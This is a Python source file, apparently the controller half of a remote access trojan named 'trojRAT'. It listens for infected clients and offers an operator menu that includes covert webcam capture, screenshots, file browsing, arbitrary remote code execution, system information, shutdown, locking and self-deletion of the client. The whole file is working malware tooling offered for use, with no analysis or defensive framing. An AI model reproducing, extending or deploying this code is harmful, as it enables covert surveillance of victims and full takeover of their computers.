import socket, os, time

IP = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
IP.connect(("8.8.8.8", 80))

HOST = "0.0.0.0"
PORT = 5250

def SocketConnection():
    global trojRAT, conn
    try:
        trojRAT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except (socket.error, Exception):
        print("[-] Error Creating Socket")
        
    try:
        trojRAT.bind((HOST,PORT))
        trojRAT.listen(20)
        print("(Listening for Incoming Connections)\n\n" + "Your IP: " + "(" +IP.getsockname()[0] + ")\nListening Port: " + "(" + str(PORT) + ")\n" + "_"*37)
    except (socket.error, Exception):
        print("[-] Error Binding Socket")
    
    while (True):
        try:
            conn, address = trojRAT.accept()
            print("[+] Client Connected: (" + conn.recv(1024).decode() + ")\n")
            return (True)
        except (socket.error, Exception):
            print("[-] Error Accepting Connection")
            continue

def UsableCommands():
    print("_"*42 + "\n[Visual Commands]" + " "*24 + "|\n" + " "*41 + "|")
    print("[-sm] ~ Send Message (VBS)" + " "*15 + "|")
    print("_"*41 + "|" + "\n[System Commands]" + " "*24 + "|\n" + " "*41 + "|")
    print("[-ui] ~ User Information" + " "*17 + "|")
    print("[-sd] ~ Shutdown Computer" + " "*16 + "|")
    print("[-rc] ~ Restart Computer" + " "*17 + "|")
    print("[-lk] ~ Lock Computer" + " "*20 + "|")
    print("[-ex] ~ Execute Written Code" + " "*13 + "|")
    print("_"*41 + "|" + "\n[User Interface Commands]" + " "*16 + "|\n" + " "*41 + "|")
    print("[-wc] ~ Activate Webcam" + " "*18 + "|")
    print("[-ss] ~ Take Screenshot" + " "*18 + "|")
    print("_"*41 + "|" + "\n[File Commands]" + " "*26 + "|\n" + " "*41 + "|")
    print("[-gd] ~ Current Directory" + " "*16 + "|")
    print("[-vf] ~ View Files" + " "*23 + "|")
    print("_"*41 + "|\n[Connection Commands]" + " "*20 + "|\n" + " "*41 + "|")
    print("[-bk] ~ Append Connection" + " "*16 + "|")
    print("[-cc] ~ Terminate Connection/Program" + " "*5 + "|\n" + "_"*41 + "|\n")
    
def ReceiveWebcamImage():
    conn.send("activate-webcam".encode())
    print(conn.recv(1024).decode())
    
    with open("webcam.png", "wb") as objWebcam:
        objWebcam.write(conn.recv(400000))
        objWebcam.close()
        
    if (os.path.getsize("webcam.png") > 50000):
        return
    else: os.remove("webcam.png")
        
def ReceiveScreenshot():
    conn.send("capture-screen".encode())
    print(conn.recv(1024).decode())
    
    with open("screenshot.png", "wb") as objScreenshot:
        objScreenshot.write(conn.recv(150000))
        objScreenshot.close()
        
    if (os.path.getsize("screenshot.png") > 5000):
        return
    else: os.remove("screenshot.png")
    
def ViewRequestedFiles():
    conn.send("view-files".encode()); print("(Client Drives)\n\n" + conn.recv(1024).decode() + "\n")
    select_path = input("[Directory]: ")
    conn.send(select_path.encode())
    print(conn.recv(1024).decode() + "\n")
    
def ExecuteCode():
    conn.send("execute-code".encode())
    code = input("\n"+ "<Enter Code>\n"); conn.send(code.encode())
    if (code == "exit" or code == "EXIT" or code == "" or code == " "):
        return
    else:
        print("-"*37 + "\n" + conn.recv(1024).decode() + "\n")
        
def ClientCommands():
    while (True):
        try:
            RemoteCommand = input("(!)> ")
            if (RemoteCommand == "help" or RemoteCommand == "HELP"):
                UsableCommands()
                
            elif (RemoteCommand == "cls" or RemoteCommand ==  "CLS" or RemoteCommand == "clear" or RemoteCommand == "CLEAR"):
                os.system("cls")
                
            elif (RemoteCommand == "-cc" or RemoteCommand == "-CC"):
                conn.send("delete-program".encode()); print("(Terminating Connection)");
                conn.close(); break;
                
            elif (RemoteCommand == "-bk" or RemoteCommand == "-BK"):
                conn.send("append-connection".encode()); print("(Appending Connection)"); break
                
            elif (RemoteCommand == "-sm" or RemoteCommand == "-SM"):
                conn.send("message-box".encode()); message = input("(Type Message): ")
                conn.send(message.encode()); print(conn.recv(1024).decode() + "\n")
            
            elif (RemoteCommand == "-ui" or RemoteCommand == "-UI"):
                conn.send("get-sys".encode()); print("[System Information]\n" + "-"*30 + "\n" + conn.recv(1024).decode() + "\n")
                
            elif (RemoteCommand == "-wc" or RemoteCommand == "-WC"):
                ReceiveWebcamImage()
            
            elif (RemoteCommand == "-ss" or RemoteCommand == "-SS"):
                ReceiveScreenshot()
            
            elif (RemoteCommand == "-sd" or RemoteCommand == "-SD"):
                conn.send("shutdown-pc".encode()); print(conn.recv(1024).decode() + "\n")
            
            elif (RemoteCommand == "-rc" or RemoteCommand == "-RC"):
                conn.send("restart-pc".encode()); print(conn.recv(1024).decode() + "\n")
            
            elif (RemoteCommand == "-lk" or RemoteCommand == "-LK"):
                conn.send("lock-pc".encode()); print(conn.recv(1024).decode() + "\n")
                
            elif (RemoteCommand == "-gd" or RemoteCommand == "-GD"):
                conn.send("current-directory".encode()); print("[" + conn.recv(1024).decode() + "]\n")
            
            elif (RemoteCommand == "-vf" or RemoteCommand == "-VF"):
                ViewRequestedFiles()
            
            elif (RemoteCommand == "-ex" or RemoteCommand == "-EX"):
                ExecuteCode()
            else:
                print("(Invalid Command)\n")
        
        except (KeyboardInterrupt):
            conn.send("append-connection".encode())
            print("\n\n[-] Keyboard Interrupted: Disconnecting...")
            break
        
        except (socket.error, Exception):
            os.system("cls"); print("[-] Lost Connection")
            time.sleep(1); conn.close()
            reconnect = input("Attempt Reconnect? (y/n): ")
            if (reconnect == "y" or reconnect == "Y" or reconnect == "yes" or reconnect == "YES"):
                os.system("cls"); SocketConnection()
            else:
                print("\n(Exiting Server)"); exit(0)

SocketConnection()
ClientCommands()